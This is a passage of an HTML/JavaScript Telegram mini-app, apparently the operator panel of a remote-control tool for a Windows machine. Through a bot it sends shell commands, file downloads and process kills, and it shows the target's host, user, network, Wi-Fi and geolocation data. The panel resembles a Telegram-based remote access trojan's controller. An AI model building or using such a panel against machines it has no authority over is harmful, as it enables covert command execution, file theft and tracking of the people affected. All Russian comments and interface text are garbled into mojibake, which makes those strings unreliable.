            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —á–µ—Ä–µ–∑ Telegram
            tg.sendData(JSON.stringify(command));
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —á—Ç–æ –∫–æ–º–∞–Ω–¥–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞
            setTimeout(() => {
                updateStatus('‚úÖ –ö–æ–º–∞–Ω–¥–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞');
            }, 500);
        }

        // ==================== –°–ü–ï–¶–ò–ê–õ–ò–ó–ò–†–û–í–ê–ù–ù–´–ï –§–£–ù–ö–¶–ò–ò ====================
        function changeDir() {
            const path = document.getElementById('folderInput').value;
            if (path) {
                sendCommand('change_dir', { path: path, current: currentDir });
                document.getElementById('folderInput').value = '';
            }
        }

        function downloadFile() {
            const name = document.getElementById('fileName').value;
            if (name) {
                sendCommand('get', { path: currentDir + '\\' + name });
            }
        }

        function createFolder() {
            const name = document.getElementById('newFolderName').value;
            if (name) {
                sendCommand('mkdir', { path: currentDir + '\\' + name });
                document.getElementById('newFolderName').value = '';
            }
        }

        function renameItem() {
            const oldName = document.getElementById('oldName').value;
            const newName = document.getElementById('newName').value;
            if (oldName && newName) {
                sendCommand('rename', { 
                    old: currentDir + '\\' + oldName,
                    new: currentDir + '\\' + newName 
                });
            }
        }

        function copyItem() {
            const src = document.getElementById('copySource').value;
            const dst = document.getElementById('copyDest').value;
            if (src && dst) {
                sendCommand('copy', { source: src, dest: dst });
            }
        }

        function searchFiles() {
            const query = document.getElementById('searchQuery').value;
            if (query) {
                sendCommand('search', { query: query, path: currentDir });
            }
        }

        function killProcess() {
            const pid = document.getElementById('processPid').value;
            if (pid) {
                sendCommand('kill_process', { pid: parseInt(pid) });
            }
        }

        function killProcessByName() {
            const name = document.getElementById('processName').value;
            if (name) {
                sendCommand('kill_process_name', { name: name });
            }
        }

        function runCommand() {
            const cmd = document.getElementById('consoleCommand').value;
            if (cmd) {
                sendCommand('cmd', { command: cmd });
                document.getElementById('consoleCommand').value = '';
            }
        }

        // ==================== –î–ê–®–ë–û–†–î ====================
        function loadDashboard() {
            sendCommand('system_info');
        }

        function startAutoRefresh() {
            if (autoRefresh) {
                clearInterval(refreshInterval);
                autoRefresh = false;
                updateStatus('‚èπÔ∏è –ê–≤—Ç–æ–æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –æ—Ç–∫–ª—é—á–µ–Ω–æ');
            } else {
                refreshInterval = setInterval(() => {
                    sendCommand('system_info');
                }, 5000);
                autoRefresh = true;
                updateStatus('‚è±Ô∏è –ê–≤—Ç–æ–æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –≤–∫–ª—é—á–µ–Ω–æ');
            }
        }

        function updateDashboard(data) {
            if (data.cpu_percent) {
                document.getElementById('cpuStat').textContent = data.cpu_percent + '%';
                document.getElementById('cpuPercent').textContent = data.cpu_percent + '%';
                document.getElementById('cpuProgress').style.width = data.cpu_percent + '%';
            }
            if (data.ram_percent) {
                document.getElementById('ramStat').textContent = data.ram_percent + '%';
                document.getElementById('ramPercent').textContent = data.ram_percent + '%';
                document.getElementById('ramProgress').style.width = data.ram_percent + '%';
            }
            if (data.disk_percent) {
                document.getElementById('diskStat').textContent = data.disk_percent + '%';
                document.getElementById('diskPercent').textContent = data.disk_percent + '%';
                document.getElementById('diskProgress').style.width = data.disk_percent + '%';
            }
            if (data.process_count) {
                document.getElementById('procStat').textContent = data.process_count;
            }
            
            const quickInfo = document.getElementById('quickInfo');
            quickInfo.innerHTML = `
                <div>üñ•Ô∏è –û–°: ${data.os || '?'}</div>
                <div>üíª –ö–æ–º–ø—å—é—Ç–µ—Ä: ${data.hostname || '?'}</div>
                <div>üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: ${data.username || '?'}</div>
                <div>‚è±Ô∏è –ó–∞–ø—É—Å–∫: ${data.boot_time || '?'}</div>
                <div>‚öôÔ∏è –ü—Ä–æ—Ü–µ—Å—Å–æ—Ä–æ–≤: ${data.cpu_count || '?'}</div>
                <div>üíæ –û–ó–£: ${data.ram_used || '?'}/${data.ram_total || '?'} –ì–ë</div>
                <div>üíø –î–∏—Å–∫: ${data.disk_used || '?'}/${data.disk_total || '?'} –ì–ë</div>
            `;
        }

        // ==================== –ü–û–õ–£–ß–ï–ù–ò–ï –û–¢–í–ï–¢–û–í ====================
        async function getUpdates() {
            try {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
                const response = await fetch(url);
                const data = await response.json();
                
                if (data.ok && data.result.length > 0) {
                    data.result.forEach(update => {
                        lastUpdateId = update.update_id;
                        
                        if (update.message && update.message.text) {
                            try {
                                const response = JSON.parse(update.message.text);
                                handleResponse(response);
                            } catch (e) {
                                // –û–±—ã—á–Ω—ã–π —Ç–µ–∫—Å—Ç - –∏–≥–Ω–æ—Ä–∏—Ä—É–µ–º
                            }
                        }
                    });
                }
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏–π:', error);
            }
        }

        // ==================== –û–ë–†–ê–ë–û–¢–ö–ê –û–¢–í–ï–¢–û–í ====================
        function handleResponse(response) {
            console.log('üì© –ü–æ–ª—É—á–µ–Ω –æ—Ç–≤–µ—Ç:', response);
            updateStatus('‚úÖ –î–∞–Ω–Ω—ã–µ –ø–æ–ª—É—á–µ–Ω—ã');
            
            // –°–∏—Å—Ç–µ–º–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
            if (response.os) {
                updateDashboard(response);
                if (document.getElementById('systemOutput')) {
                    displaySystemInfo(response);
                }
            }
            
            // –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–µ
            if (response.cores) {
                displayCPUInfo(response);
            }
            
            // –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–∞–º—è—Ç–∏
            if (response.total && response.used) {
                displayRAMInfo(response);
            }
            
            // –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –¥–∏—Å–∫–∞—Ö
            if (Array.isArray(response) && response[0]?.device) {
                displayDiskInfo(response);
            }
            
            // –§–∞–π–ª—ã
            if (response.files) {
                displayFiles(response);
            }
            
            // –ü—Ä–æ—Ü–µ—Å—Å—ã
            if (response.processes) {
                displayProcesses(response.processes);
            }
            
            // –°–µ—Ç–µ–≤–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
            if (response.hostname) {
                displayNetworkInfo(response);
                if (document.getElementById('networkOutput')) {
                    document.getElementById('networkOutput').innerHTML = formatNetworkInfo(response);
                }
            }
            
            // Wi-Fi –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
            if (Array.isArray(response) && response[0]?.includes('üì∂')) {
                if (document.getElementById('networkOutput')) {
                    document.getElementById('networkOutput').innerHTML = response.join('\n');
                }
            }
            
            // –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è
            if (response.country) {
                if (document.getElementById('geoOutput')) {
                    document.getElementById('geoOutput').innerHTML = formatGeoInfo(response);
                }
            }
            
            // –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –±–∞—Ç–∞—Ä–µ–µ
            if (response.battery_percent !== undefined) {
                if (document.getElementById('systemOutput')) {
                    document.getElementById('systemOutput').innerHTML = formatBatteryInfo(response);
                }
            }
            
            // –ö–æ–º–∞–Ω–¥–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞
            if (response.success) {
                updateStatus('‚úÖ ' + (response.message || '–ö–æ–º–∞–Ω–¥–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞'));
            }
            
            // –û—à–∏–±–∫–∞
            if (response.error) {
                updateStatus('‚ùå ' + response.error);
            }
            
            // –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ localStorage
            localStorage.setItem('lastData', JSON.stringify(response));
        }

        // ==================== –§–û–†–ú–ê–¢–¢–ï–†–´ ====================
        function displaySystemInfo(data) {
            const html = `
üñ•Ô∏è **–û–ü–ï–†–ê–¶–ò–û–ù–ù–ê–Ø –°–ò–°–¢–ï–ú–ê**
‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
–ù–∞–∑–≤–∞–Ω–∏–µ: ${data.os || '?'}
–í–µ—Ä—Å–∏—è: ${data.release || '?'}
–ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞: ${data.arch || '?'}
–ö–æ–º–ø—å—é—Ç–µ—Ä: ${data.hostname || '?'}
–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: ${data.username || '?'}
–ó–∞–ø—É—Å–∫: ${data.boot_time || '?'}
–í—Ä–µ–º—è —Ä–∞–±–æ—Ç—ã: ${data.uptime || '?'}

‚öôÔ∏è **–ü–†–û–¶–ï–°–°–û–†**
‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
–ú–æ–¥–µ–ª—å: ${data.cpu_model || '?'}
–Ø–¥–µ—Ä: ${data.cpu_count || '?'} (${data.cpu_logical || '?'} –ª–æ–≥–∏—á–µ—Å–∫–∏—Ö)
–ó–∞–≥—Ä—É–∑–∫–∞: ${data.cpu_percent || '?'}%
–ß–∞—Å—Ç–æ—Ç–∞: ${data.cpu_freq || '?'} –ú–ì—Ü

üíæ **–û–ü–ï–†–ê–¢–ò–í–ù–ê–Ø –ü–ê–ú–Ø–¢–¨**
‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
–í—Å–µ–≥–æ: ${data.ram_total || '?'} –ì–ë
–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ: ${data.ram_used || '?'} –ì–ë (${data.ram_percent || '?'}%)
–î–æ—Å—Ç—É–ø–Ω–æ: ${data.ram_available || '?'} –ì–ë

üíø **–î–ò–°–ö C:**
‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
–í—Å–µ–≥–æ: ${data.disk_total || '?'} –ì–ë
–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ: ${data.disk_used || '?'} –ì–ë (${data.disk_percent || '?'}%)
–°–≤–æ–±–æ–¥–Ω–æ: ${data.disk_free || '?'} –ì–ë

üå°Ô∏è **–¢–ï–ú–ü–ï–†–ê–¢–£–†–ê**
‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
CPU: ${data.cpu_temp || '?'}¬∞C
GPU: ${data.gpu_temp || '?'}¬∞C
            `;
            
            if (document.getElementById('systemOutput')) {
                document.getElementById('systemOutput').innerHTML = html;
            }
        }

        function displayCPUInfo(data) {
            let html = '‚öôÔ∏è **–ü–†–û–¶–ï–°–°–û–†**\n‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\n\n';
            if (data.cores) {
                data.cores.forEach((core, i) => {
                    const bar = '‚ñà'.repeat(Math.floor(core/4)) + '‚ñë'.repeat(25 - Math.floor(core/4));
                    html += `–Ø–¥—Ä–æ ${i}: [${bar}] ${core}%\n`;
                });
                html += `\nüìä –ß–∞—Å—Ç–æ—Ç–∞: ${data.freq || '?'} –ú–ì—Ü`;
                html += `\nüìà –°—Ä–µ–¥–Ω—è—è –∑–∞–≥—Ä—É–∑–∫–∞: ${data.avg || '?'}%`;
            }
            if (document.getElementById('systemOutput')) {
                document.getElementById('systemOutput').innerHTML = html;
            }
        }

        function displayRAMInfo(data) {
            const html = `
üíæ **–û–ü–ï–†–ê–¢–ò–í–ù–ê–Ø –ü–ê–ú–Ø–¢–¨**
‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
–í—Å–µ–≥–æ: ${data.total || '?'}
–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ: ${data.used || '?'} (${data.percent || '?'}%)
–î–æ—Å—Ç—É–ø–Ω–æ: ${data.available || '?'}

üîÑ **SWAP**
‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
–í—Å–µ–≥–æ: ${data.swap_total || '?'}
–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ: ${data.swap_used || '?'} (${data.swap_percent || '?'}%)

üìä **–î–ï–¢–ê–õ–ò**
‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
–ö–µ—à–∏—Ä–æ–≤–∞–Ω–æ: ${data.cached || '?'}
–ë—É—Ñ–µ—Ä: ${data.buffers || '?'}
–ê–∫—Ç–∏–≤–Ω–æ: ${data.active || '?'}
–ù–µ–∞–∫—Ç–∏–≤–Ω–æ: ${data.inactive || '?'}
            `;
            if (document.getElementById('systemOutput')) {
                document.getElementById('systemOutput').innerHTML = html;
            }
        }

        function displayDiskInfo(disks) {
            let html = 'üíø **–î–ò–°–ö–ò**\n‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\n\n';
            disks.forEach(disk => {
                const bar = '‚ñà'.repeat(Math.floor(disk.percent/4)) + '‚ñë'.repeat(25 - Math.floor(disk.percent/4));
                html += `${disk.device} (${disk.mount})\n`;
                html += `  –§–°: ${disk.fstype || '?'}\n`;
                html += `  –í—Å–µ–≥–æ: ${disk.total}\n`;
                html += `  –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ: [${bar}] ${disk.used} (${disk.percent}%)\n`;
                html += `  –°–≤–æ–±–æ–¥–Ω–æ: ${disk.free}\n\n`;
            });
            if (document.getElementById('systemOutput')) {
                document.getElementById('systemOutput').innerHTML = html;
            }
        }

        function displayFiles(data) {
            if (data.current_dir) {
                currentDir = data.current_dir;
                document.getElementById('currentPath').textContent = currentDir;
            }
            
            if (data.files) {
                let html = '';
                data.files.slice(0, 50).forEach(f => {
                    const icon = f.is_dir ? 'üìÅ' : 'üìÑ';
                    const size = f.size || '';
                    const date = f.modified || '';
                    html += `
                        <div class="file-item" onclick="selectFile('${f.name.replace(/'/g, "\\'")}')">
                            <span class="file-icon">${icon}</span>
                            <span class="file-name">${f.name}</span>
                            <span class="file-size">${size}</span>
                            <span class="file-date">${date}</span>
                        </div>
                    `;
                });
                document.getElementById('fileList').innerHTML = html;
                
                if (data.files.length > 50) {
                    document.getElementById('fileList').innerHTML += 
                        `<div style="padding: 15px; text-align: center; color: #666;">
                            ... –∏ –µ—â—ë ${data.files.length - 50} —ç–ª–µ–º–µ–Ω—Ç–æ–≤
                        </div>`;
                }
            }
        }

        function displayProcesses(processes) {
            let html = '';
            processes.slice(0, 30).forEach(p => {
                html += `
                    <div class="proc-row" onclick="selectProcess(${p.pid})">
                        <span class="proc-pid">${p.pid}</span>
                        <span>${p.name}</span>
                        <span class="proc-cpu">${p.cpu}%</span>
                        <span class="proc-ram">${p.ram}%</span>
                    </div>
                `;
            });
            document.getElementById('processesList').innerHTML = html;
        }

        function displayNetworkInfo(data) {
            return `
üåê **–°–ï–¢–¨**
‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
–ö–æ–º–ø—å—é—Ç–µ—Ä: ${data.hostname}
MAC-–∞–¥—Ä–µ—Å: ${data.mac || '?'}
–õ–æ–∫–∞–ª—å–Ω—ã–π IP: ${data.local_ip}
–í–Ω–µ—à–Ω–∏–π IP: ${data.external_ip}
–ü—Ä–æ–≤–∞–π–¥–µ—Ä: ${data.isp || '?'}
–ì–æ—Ä–æ–¥: ${data.city || '?'}
–°—Ç—Ä–∞–Ω–∞: ${data.country || '?'}

üìä **–¢–†–ê–§–ò–ö**
‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ: ${data.bytes_sent}
–ü–æ–ª—É—á–µ–Ω–æ: ${data.bytes_recv}
–ü–∞–∫–µ—Ç–æ–≤ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ: ${data.packets_sent}
–ü–∞–∫–µ—Ç–æ–≤ –ø–æ–ª—É—á–µ–Ω–æ: ${data.packets_recv}
            `;
        }

        function formatGeoInfo(data) {
            return `
üåç **–ì–ï–û–õ–û–ö–ê–¶–ò–Ø**
‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
IP –∞–¥—Ä–µ—Å: ${data.query || '?'}
–°—Ç—Ä–∞–Ω–∞: ${data.country || '?'}
–†–µ–≥–∏–æ–Ω: ${data.region || '?'}
–ì–æ—Ä–æ–¥: ${data.city || '?'}
–ü—Ä–æ–≤–∞–π–¥–µ—Ä: ${data.isp || '?'}
–û—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏—è: ${data.org || '?'}
–ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã: ${data.lat || '?'}, ${data.lon || '?'}
            `;
        }

        function formatBatteryInfo(data) {
            return `
üîã **–ë–ê–¢–ê–†–ï–Ø**
‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
–ó–∞—Ä—è–¥: ${data.battery_percent}%
–°–æ—Å—Ç–æ—è–Ω–∏–µ: ${data.battery_plugged ? 'üîå –û—Ç —Å–µ—Ç–∏' : 'üîã –ù–∞ –±–∞—Ç–∞—Ä–µ–µ'}
–û—Å—Ç–∞–ª–æ—Å—å: ${data.battery_time || '?'}
–ó–¥–æ—Ä–æ–≤—å–µ: ${data.battery_health || '?'}
            `;
        }

        // ==================== –í–°–ü–û–ú–û–ì–ê–¢–ï–õ–¨–ù–´–ï –§–£–ù–ö–¶–ò–ò ====================
        function selectFile(name) {
            document.getElementById('fileName').value = name;
        }

        function selectProcess(pid) {
            document.getElementById('processPid').value = pid;
        }

        function updateStatus(message) {
            document.getElementById('statusMessage').textContent = message;
        }

        function closeApp() {
            tg.close();
        }

        // ==================== –ó–ê–ì–†–£–ó–ö–ê –î–ê–ù–ù–´–• ====================
        function loadFiles() {
            sendCommand('list_files', { path: currentDir });
        }

        function loadProcesses() {
            sendCommand('processes');
        }

        // ==================== –ó–ê–ü–£–°–ö ====================
        setInterval(getUpdates, 2000);
        
        // –ó–∞–≥—Ä—É–∂–∞–µ–º –ø–æ—Å–ª–µ–¥–Ω–∏–µ –¥–∞–Ω–Ω—ã–µ
        window.onload = function() {
            const saved = localStorage.getItem('lastData');
            if (saved) {
                try {
                    const data = JSON.parse(saved);
                    handleResponse(data);
                } catch (e) {}
            }
            loadDashboard();
        };
    </script>
</body>
</html>
